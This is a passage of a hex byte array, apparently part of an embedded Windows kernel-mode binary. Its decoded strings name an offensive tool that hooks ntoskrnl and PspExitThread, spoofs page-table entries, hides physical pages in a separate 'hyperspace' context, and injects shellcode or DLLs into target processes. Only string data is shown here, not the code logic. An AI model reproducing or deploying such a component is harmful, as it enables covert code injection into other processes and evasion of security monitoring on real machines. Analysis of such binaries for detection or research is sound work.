    0x00, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x5F, 0x6E, 0x6F, 0x74, 0x69, 0x66, 0x79, 0x5F,
    0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x5F, 0x69, 0x6D, 0x70, 0x6C, 0x00, 0x63, 0x6C,
    0x65, 0x61, 0x6E, 0x75, 0x70, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x75, 0x61, 0x6C,
    0x69, 0x7A, 0x65, 0x64, 0x5F, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x00, 0x63, 0x72,
    0x65, 0x61, 0x74, 0x65, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x75, 0x61, 0x6C, 0x69,
    0x7A, 0x65, 0x64, 0x5F, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x20, 0x73, 0x65,
    0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E,
    0x6C, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61,
    0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x20,
    0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B,
    0x20, 0x69, 0x6E, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,
    0x20, 0x25, 0x75, 0x20, 0x69, 0x73, 0x20, 0x6E, 0x75, 0x6C, 0x6C, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x74, 0x72, 0x61,
    0x63, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x72, 0x72, 0x61, 0x79, 0x20, 0x66, 0x75, 0x6C, 0x6C,
    0x00, 0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x00, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x5F,
    0x68, 0x6F, 0x6F, 0x6B, 0x5F, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x00, 0x69, 0x6E,
    0x73, 0x74, 0x61, 0x6C, 0x6C, 0x5F, 0x68, 0x6F, 0x6F, 0x6B, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F,
    0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x20, 0x50, 0x73, 0x70, 0x45, 0x78, 0x69, 0x74,
    0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x68, 0x6F, 0x6F, 0x6B, 0x00, 0x69, 0x6E, 0x73, 0x74,
    0x61, 0x6C, 0x6C, 0x5F, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x5F, 0x63, 0x61, 0x6C, 0x6C,
    0x62, 0x61, 0x63, 0x6B, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20,
    0x6C, 0x65, 0x67, 0x69, 0x74, 0x69, 0x6D, 0x61, 0x74, 0x65, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65,
    0x72, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x63, 0x61,
    0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x73, 0x70, 0x6F,
    0x6F, 0x66, 0x20, 0x70, 0x74, 0x65, 0x20, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x20, 0x66, 0x6F, 0x72,
    0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63,
    0x6B, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x72,
    0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x69, 0x73, 0x20, 0x74, 0x65,
    0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74, 0x69, 0x6E, 0x67, 0x00, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61,
    0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x70, 0x61, 0x67, 0x65, 0x5F, 0x74, 0x72, 0x61, 0x63, 0x6B, 0x69,
    0x6E, 0x67, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66,
    0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20, 0x4E,
    0x4F, 0x50, 0x20, 0x70, 0x61, 0x64, 0x64, 0x69, 0x6E, 0x67, 0x00, 0x7E, 0x6B, 0x65, 0x72, 0x6E,
    0x65, 0x6C, 0x5F, 0x6F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x5F, 0x72, 0x65, 0x66, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64,
    0x20, 0x74, 0x6F, 0x20, 0x63, 0x61, 0x6C, 0x63, 0x75, 0x6C, 0x61, 0x74, 0x65, 0x20, 0x68, 0x6F,
    0x6F, 0x6B, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x00, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x61, 0x74, 0x65,
    0x5F, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x5F, 0x73, 0x74, 0x61, 0x74, 0x65, 0x00, 0x72,
    0x65, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x00, 0x67, 0x65, 0x74, 0x5F, 0x6D, 0x6F, 0x64, 0x75, 0x6C,
    0x65, 0x5F, 0x62, 0x61, 0x73, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x67, 0x65, 0x74,
    0x20, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20,
    0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x79, 0x20, 0x62, 0x61, 0x73, 0x65, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65,
    0x64, 0x20, 0x74, 0x6F, 0x20, 0x6C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x20, 0x74, 0x61, 0x72, 0x67,
    0x65, 0x74, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x64, 0x69, 0x72, 0x65, 0x63,
    0x74, 0x6F, 0x72, 0x79, 0x20, 0x62, 0x61, 0x73, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x4E, 0x54,
    0x20, 0x68, 0x65, 0x61, 0x64, 0x65, 0x72, 0x20, 0x73, 0x69, 0x67, 0x6E, 0x61, 0x74, 0x75, 0x72,
    0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E,
    0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x68, 0x65, 0x61, 0x64, 0x65, 0x72,
    0x20, 0x73, 0x69, 0x67, 0x6E, 0x61, 0x74, 0x75, 0x72, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F,
    0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x20, 0x74, 0x72, 0x61, 0x6D, 0x70, 0x6F, 0x6C, 0x69,
    0x6E, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63,
    0x6F, 0x75, 0x6C, 0x64, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x2E, 0x74,
    0x65, 0x78, 0x74, 0x20, 0x73, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x6D,
    0x61, 0x69, 0x6E, 0x20, 0x6D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x00, 0x7E, 0x6B, 0x65, 0x72, 0x6E,
    0x65, 0x6C, 0x5F, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x00, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x61,
    0x74, 0x65, 0x5F, 0x69, 0x6E, 0x64, 0x65, 0x78, 0x5F, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x00, 0x73,
    0x70, 0x6F, 0x6F, 0x66, 0x5F, 0x70, 0x74, 0x65, 0x5F, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x00, 0x61,
    0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x5F, 0x74, 0x72, 0x61, 0x63, 0x6B, 0x65, 0x64, 0x5F,
    0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x5F, 0x70, 0x61, 0x67, 0x65, 0x00, 0x61, 0x64,
    0x64, 0x5F, 0x74, 0x72, 0x61, 0x63, 0x6B, 0x65, 0x64, 0x5F, 0x70, 0x61, 0x67, 0x65, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65,
    0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x69, 0x6E,
    0x64, 0x65, 0x70, 0x65, 0x6E, 0x64, 0x65, 0x6E, 0x74, 0x20, 0x70, 0x61, 0x67, 0x65, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65,
    0x64, 0x20, 0x74, 0x6F, 0x20, 0x67, 0x65, 0x74, 0x20, 0x70, 0x66, 0x6E, 0x20, 0x66, 0x6F, 0x72,
    0x20, 0x70, 0x61, 0x67, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x68, 0x69, 0x64, 0x65,
    0x20, 0x70, 0x66, 0x6E, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x70, 0x61, 0x67, 0x65, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64,
    0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x61, 0x63, 0x74,
    0x75, 0x61, 0x6C, 0x20, 0x70, 0x61, 0x67, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61,
    0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C,
    0x20, 0x70, 0x61, 0x67, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x74, 0x72, 0x61, 0x63,
    0x6B, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x64, 0x20, 0x70, 0x61, 0x67, 0x65,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x72, 0x65,
    0x65, 0x64, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x50, 0x4D,
    0x4C, 0x34, 0x20, 0x70, 0x61, 0x67, 0x65, 0x00, 0x75, 0x73, 0x65, 0x72, 0x6D, 0x6F, 0x64, 0x65,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69,
    0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20,
    0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x20, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x66, 0x6F,
    0x72, 0x20, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74,
    0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x72, 0x65, 0x6D, 0x6F, 0x74,
    0x65, 0x20, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65, 0x00, 0x73, 0x77, 0x69, 0x74,
    0x63, 0x68, 0x5F, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78,
    0x74, 0x5F, 0x74, 0x6F, 0x5F, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x00,
    0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x5F, 0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x5F, 0x68,
    0x6F, 0x6F, 0x6B, 0x73, 0x5F, 0x69, 0x6E, 0x5F, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61,
    0x63, 0x65, 0x00, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x5F, 0x69, 0x6E, 0x5F, 0x68,
    0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x00, 0x73, 0x77, 0x69, 0x74, 0x63, 0x68,
    0x5F, 0x66, 0x72, 0x6F, 0x6D, 0x5F, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69,
    0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x6C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x20, 0x74, 0x61,
    0x72, 0x67, 0x65, 0x74, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x66, 0x6F, 0x72,
    0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x20, 0x70,
    0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x25, 0x64, 0x20, 0x74, 0x65, 0x72, 0x6D, 0x69, 0x6E,
    0x61, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x2D, 0x20, 0x63, 0x6C, 0x65, 0x61, 0x6E, 0x69, 0x6E, 0x67,
    0x20, 0x75, 0x70, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61,
    0x64, 0x20, 0x25, 0x64, 0x20, 0x73, 0x77, 0x69, 0x74, 0x63, 0x68, 0x65, 0x64, 0x20, 0x74, 0x6F,
    0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x25,
    0x64, 0x20, 0x73, 0x77, 0x69, 0x74, 0x63, 0x68, 0x65, 0x64, 0x20, 0x62, 0x61, 0x63, 0x6B, 0x20,
    0x66, 0x72, 0x6F, 0x6D, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x00,
    0x66, 0x69, 0x6E, 0x64, 0x5F, 0x75, 0x6E, 0x75, 0x73, 0x65, 0x64, 0x5F, 0x73, 0x70, 0x61, 0x63,
    0x65, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61,
    0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x61, 0x6E, 0x79,
    0x20, 0x6E, 0x6F, 0x6E, 0x2D, 0x70, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x20, 0x50, 0x4D, 0x4C,
    0x34, 0x45, 0x20, 0x69, 0x6E, 0x20, 0x25, 0x73, 0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x00, 0x61,
    0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x5F, 0x61, 0x74, 0x5F, 0x6E, 0x6F, 0x6E, 0x5F, 0x70,
    0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x5F, 0x70, 0x6D, 0x6C, 0x34, 0x65, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x50, 0x73, 0x4C, 0x6F, 0x61, 0x64, 0x65,
    0x64, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x4C, 0x69, 0x73, 0x74, 0x20, 0x6E, 0x6F, 0x74, 0x20,
    0x66, 0x6F, 0x75, 0x6E, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x6E, 0x6F, 0x20, 0x66, 0x72, 0x65, 0x65, 0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20,
    0x66, 0x6F, 0x75, 0x6E, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x75, 0x6E, 0x73, 0x75, 0x70, 0x70, 0x6F, 0x72, 0x74, 0x65, 0x64, 0x20, 0x77, 0x69,
    0x6E, 0x20, 0x62, 0x75, 0x69, 0x6C, 0x64, 0x00, 0x69, 0x73, 0x5F, 0x70, 0x66, 0x6E, 0x5F, 0x76,
    0x61, 0x6C, 0x69, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x63, 0x6F, 0x6E, 0x74,
    0x65, 0x78, 0x74, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69,
    0x7A, 0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x63, 0x6F, 0x6E, 0x74, 0x65,
    0x78, 0x74, 0x20, 0x63, 0x6C, 0x65, 0x61, 0x6E, 0x75, 0x70, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x6C,
    0x65, 0x74, 0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20,
    0x25, 0x64, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64, 0x00, 0x75, 0x70, 0x64, 0x61, 0x74,
    0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x73,
    0x77, 0x61, 0x70, 0x20, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x20, 0x72, 0x65, 0x71, 0x75,
    0x65, 0x73, 0x74, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x72, 0x65, 0x73, 0x74, 0x6F, 0x72, 0x65, 0x20, 0x63,
    0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x20, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x20, 0x63,
    0x61, 0x6C, 0x6C, 0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x69, 0x6E, 0x64, 0x65, 0x70,
    0x65, 0x6E, 0x64, 0x65, 0x6E, 0x74, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x20, 0x72, 0x65, 0x71,
    0x75, 0x65, 0x73, 0x74, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x75, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x2F, 0x75,
    0x6E, 0x68, 0x6F, 0x6F, 0x6B, 0x20, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x20, 0x70, 0x74, 0x72, 0x20,
    0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x65, 0x64, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x61, 0x74, 0x74, 0x65,
    0x72, 0x6E, 0x20, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x65,
    0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x62, 0x61,
    0x73, 0x65, 0x20, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x65,
    0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x65, 0x78,
    0x65, 0x63, 0x75, 0x74, 0x65, 0x20, 0x64, 0x6C, 0x6C, 0x20, 0x76, 0x69, 0x61, 0x20, 0x74, 0x68,
    0x72, 0x65, 0x61, 0x64, 0x20, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x20, 0x63, 0x61, 0x6C,
    0x6C, 0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66, 0x75, 0x6C, 0x6C, 0x79, 0x20, 0x6E, 0x75, 0x6C,
    0x6C, 0x65, 0x64, 0x20, 0x4D, 0x4D, 0x50, 0x46, 0x4E, 0x2E, 0x50, 0x74, 0x65, 0x41, 0x64, 0x64,
    0x72, 0x65, 0x73, 0x73, 0x2C, 0x20, 0x70, 0x68, 0x79, 0x73, 0x20, 0x74, 0x6F, 0x20, 0x76, 0x69,
    0x72, 0x74, 0x20, 0x74, 0x72, 0x61, 0x6E, 0x73, 0x6C, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x68,
    0x61, 0x73, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x20, 0x63, 0x6F, 0x6E,
    0x74, 0x65, 0x78, 0x74, 0x75, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x64, 0x20, 0x6E, 0x74, 0x6F, 0x73,
    0x6B, 0x72, 0x6E, 0x6C, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x76, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x20,
    0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x75, 0x6E, 0x63, 0x68, 0x61, 0x6E, 0x67, 0x65,
    0x64, 0x20, 0x61, 0x66, 0x74, 0x65, 0x72, 0x20, 0x6E, 0x75, 0x6C, 0x6C, 0x69, 0x6E, 0x67, 0x20,
    0x4D, 0x4D, 0x50, 0x46, 0x4E, 0x2E, 0x50, 0x74, 0x65, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73,
    0x20, 0x2D, 0x20, 0x6F, 0x70, 0x65, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x6D, 0x61, 0x79,
    0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x6C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x20, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74,
